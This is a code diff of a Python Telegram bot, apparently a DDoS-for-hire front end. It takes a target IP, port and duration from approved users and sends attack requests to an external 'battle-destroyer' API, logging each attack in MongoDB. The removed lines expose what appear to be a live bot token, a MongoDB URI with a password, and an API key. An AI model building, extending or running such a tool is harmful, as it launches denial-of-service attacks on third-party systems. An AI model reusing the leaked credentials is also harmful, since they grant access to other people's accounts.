@@ -20,15 +20,31 @@ from dotenv import load_dotenv
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
+# Load environment variables
 load_dotenv()
 
-# --- CONFIG (Using Your Variables) ---
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8749691844:AAGNM0JIB5nHhVgZo2TXpbew919WKSGbt1o")
-MONGODB_URI = os.getenv("MONGODB_URI", "mongodb+srv://manasdev314_db_user:Ravirao226008@sastadev.pa9pfjb.mongodb.net/?appName=Sastadev")
-DATABASE_NAME = os.getenv("DATABASE_NAME", "attack_bot")
-API_URL = os.getenv("API_URL", "https://api.battle-destroyer.shop")
-API_KEY = os.getenv("API_KEY", "ak_e09b114844018935feffc")
+# --- CONFIG & VALIDATION ---
+def get_env_var(name, default=None):
+    value = os.getenv(name, default)
+    if value:
+        # Remove any surrounding quotes or whitespace that cause URI errors
+        return value.strip().replace('"', '').replace("'", "")
+    return value
+
+BOT_TOKEN = get_env_var("BOT_TOKEN")
+MONGODB_URI = get_env_var("MONGODB_URI")
+DATABASE_NAME = get_env_var("DATABASE_NAME", "attack_bot")
+API_URL = get_env_var("API_URL", "https://api.battle-destroyer.shop")
+API_KEY = get_env_var("API_KEY")
+
+# Hardcoded fallback for your specific admin IDs
 ADMIN_IDS = [8787952549, 1793697840]
+
+# Validate MongoDB URI format immediately
+if not MONGODB_URI or not (MONGODB_URI.startswith("mongodb://") or MONGODB_URI.startswith("mongodb+srv://")):
+    logger.error(f"CRITICAL: Invalid MONGODB_URI format. Received: {MONGODB_URI}")
+    # If it's missing, the script will stop here to prevent the traceback loop
+    raise pymongo.errors.InvalidURI("MONGODB_URI must begin with 'mongodb://' or 'mongodb+srv://'. Check your .env file or Environment Variables.")
 
 BLOCKED_PORTS = {8700, 20000, 443, 17500, 9031, 20002, 20001}
 MIN_PORT, MAX_PORT = 1, 65535
@@ -43,20 +59,26 @@ def make_aware(dt):
 def get_current_time():
     return datetime.now(timezone.utc)
 
-# --- DATABASE CLASS (Your Implementation) ---
+# --- DATABASE CLASS ---
 class Database:
     def __init__(self):
-        self.client = MongoClient(MONGODB_URI)
-        self.db = self.client[DATABASE_NAME]
-        self.users = self.db.users
-        self.attacks = self.db.attacks
-        self._setup_indexes()
+        try:
+            self.client = MongoClient(MONGODB_URI, serverSelectionTimeoutMS=5000)
+            # Trigger a connection check
+            self.client.admin.command('ping')
+            self.db = self.client[DATABASE_NAME]
+            self.users = self.db.users
+            self.attacks = self.db.attacks
+            self._setup_indexes()
+            logger.info("✅ Connected to MongoDB successfully.")
+        except Exception as e:
+            logger.error(f"❌ MongoDB Connection Failed: {e}")
+            raise e
 
     def _setup_indexes(self):
         try:
             self.users.create_index([("user_id", ASCENDING)], unique=True, sparse=True)
             self.attacks.create_index([("timestamp", DESCENDING)])
-            logger.info("Database indexes synchronized.")
         except Exception as e:
             logger.error(f"Index error: {e}")
 
@@ -88,8 +110,6 @@ class Database:
             "timestamp": get_current_time()
         })
         self.users.update_one({"user_id": user_id}, {"$inc": {"total_attacks": 1}})
-
-db = Database()
 
 # --- API INTEGRATION ---
 def call_api(endpoint, method="GET", data=None):
@@ -154,8 +174,6 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         if not (1 <= duration <= 300): return await update.message.reply_text("❌ Max time is 300s.")
         
         status_msg = await update.message.reply_text("🚀 Sending request to server...")
-        
-        # API Call
         res = call_api("attack", "POST", {"ip": ip, "port": port, "duration": duration})
         
         if res.get("success") or "id" in str(res):
@@ -164,37 +182,37 @@ async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         else:
             db.log_attack(user_id, ip, port, duration, "failed", str(res))
             await status_msg.edit_text(f"❌ API Error: {res.get('error', 'Server rejected request')}")
-            
     except ValueError:
         await update.message.reply_text("❌ Port and Time must be numbers.")
 
-# --- HEALTH CHECK & SESSION CLEARING ---
+# --- WEB SERVER & BOT STARTUP ---
 app = Flask(__name__)
 @app.route('/')
-def home(): return "Bot is running", 200
+def home(): return "Bot is alive", 200
 
 def clear_conflict():
-    """Drops webhooks to prevent 409 Conflict error on restart."""
     try:
         requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook", params={"drop_pending_updates": True})
-        logger.info("Cleaned up existing Telegram sessions.")
-        time_module.sleep(3)
+        time_module.sleep(2)
     except: pass
 
-# --- MAIN ---
+db = None
+
 def main():
+    global db
     clear_conflict()
     
-    # Run Flask for Railway
+    # Initialize DB inside main to catch the URI error gracefully
+    db = Database()
+    
     threading.Thread(target=lambda: app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000))), daemon=True).start()
 
     application = Application.builder().token(BOT_TOKEN).build()
-    
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("approve", approve))
     application.add_handler(CommandHandler("attack", attack))
     
-    print("🤖 Bot instance starting...")
+    logger.info("🤖 Bot is starting polling...")
     application.run_polling(drop_pending_updates=True)
 
 if __name__ == "__main__":
